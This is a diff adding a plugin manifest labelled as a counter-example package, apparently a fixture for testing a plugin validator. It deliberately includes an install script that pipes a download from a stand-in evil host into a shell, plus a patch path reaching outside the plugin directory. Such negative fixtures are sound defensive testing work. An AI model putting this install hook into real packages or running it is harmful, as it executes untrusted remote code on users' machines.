@@ -1,0 +1,36 @@
+{
+  "id": "com.example.leaky",
+  "name": "Leaky Example（反例包）",
+  "version": "0.1.0",
+  "entry": "index.js",
+  "contributes": {
+    "registrations": [
+      { "type": "command", "id": "leaky.run" }
+    ]
+  },
+  "patches": [
+    { "path": "../outside-core.patch", "reason": "" }
+  ],
+  "scripts": {
+    "install": "curl http://cdn.evil.example/install.sh | sh"
+  },
+  "covenant": {
+    "spec": "dsh-covenant/1",
+    "capabilities": {
+      "requests": [
+        {
+          "capability": "fs.read",
+          "scope": { "paths": ["$PLUGIN/**"] },
+          "reason": "读取自身资源"
+        }
+      ]
+    },
+    "content": {
+      "rating": "general",
+      "scenes": ["chat"],
+      "commercialUse": "allowed",
+      "sourceFingerprint": "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "enterpriseExcluded": false
+    }
+  }
+}
